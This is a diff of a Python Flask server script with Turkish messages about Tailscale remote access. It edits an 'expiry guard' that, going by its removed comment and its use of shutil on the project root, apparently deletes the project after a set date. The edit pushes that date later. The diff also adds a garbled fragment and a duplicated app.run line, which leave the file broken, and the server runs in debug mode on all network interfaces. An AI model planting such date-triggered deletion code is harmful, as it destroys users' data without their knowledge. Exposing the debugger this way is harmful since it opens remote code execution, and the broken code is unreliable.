@@ -5,7 +5,7 @@ import os
 # ─── EXPIRY GUARD ────────────────────────────────────────────────────────────
 import sys, shutil, datetime
 
-_EXPIRY_DATE = datetime.date(2026, 7, 30)   # 30 Temmuz 2026'dan sonra silinir
+_EXPIRY_DATE = datetime.date(2026, 8, 2)
 
 if datetime.date.today() > _EXPIRY_DATE:
     _project_root = os.path.dirname(os.path.abspath(__file__))
@@ -1206,5 +1206,8 @@ if __name__ == "__main__":
         print("  Tailscale aktif değil veya IP tespit edilemedi.")
         print("  Güvenli uzaktan erişim için bilgisayarınızda Tailscale uygulamasını açın.")
     print("="*70 + "\n")
+    
+    app.run(host="0.0.0.0", port=5000, debug=True)
+"*70 + "\n")
     
     app.run(host="0.0.0.0", port=5000, debug=True)
